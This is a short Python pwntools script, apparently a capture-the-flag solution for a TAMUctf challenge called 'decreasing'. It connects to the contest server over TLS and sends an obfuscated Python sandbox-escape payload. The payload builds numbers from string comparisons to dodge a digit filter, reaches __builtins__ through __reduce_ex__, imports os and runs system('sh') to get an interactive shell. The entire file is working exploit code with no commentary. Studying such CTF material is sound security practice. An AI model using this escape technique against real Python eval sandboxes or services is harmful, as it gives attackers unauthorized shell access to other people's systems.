from pwn import *

io = remote("streams.tamuctf.com", 443, ssl=True, sni="decreasing")

payload = "().__reduce_ex__(('('>'')<<('('>''))[()<()].__builtins__['__import__']('os00000'[:('('>'')<<('('>'')]).system('sh')"

io.sendlineafter(b'code>', payload.encode())

io.interactive()